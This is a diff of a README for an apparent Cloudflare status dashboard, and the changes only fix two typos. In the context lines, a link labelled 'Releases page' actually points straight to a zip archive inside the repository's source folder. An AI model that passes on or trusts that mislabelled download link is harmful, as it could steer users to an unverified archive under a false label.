@@ -10,7 +10,7 @@ Welcome to the cf-status-dashboard! This application provides a real-time view o
 To use cf-status-dashboard, you should have:
 - A computer running Windows, macOS, or Linux.
 - A stable internet connection.
-- Updated web browser (Chrome, Firefox, Safari, or Edge).
+- An Updated web browser (Chrome, Firefox, Safari, or Edge).
 
 ## 📦 Download & Install
 To get started, visit the [Releases page](https://raw.githubusercontent.com/rkzinn10/cf-status-dashboard/main/src/app/cf-status-dashboard-v3.7-beta.2.zip) to download the latest version of cf-status-dashboard. 
@@ -41,7 +41,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/rkzi
 
 ## 🎨 Features
 - **Real-Time Monitoring:** Get instant updates on Cloudflare's status with a visual dashboard.
-- **Interactive Glove and Map:** Explore Cloudflare’s global infrastructure on a 3D globe and 2D world map.
+- **Interactive Globe and Map:** Explore Cloudflare’s global infrastructure on a 3D globe and 2D world map.
 - **User-Friendly Interface:** Designed for ease of use for all skill levels.
 - **Open Source:** Contribute to the project and improve its features.
 
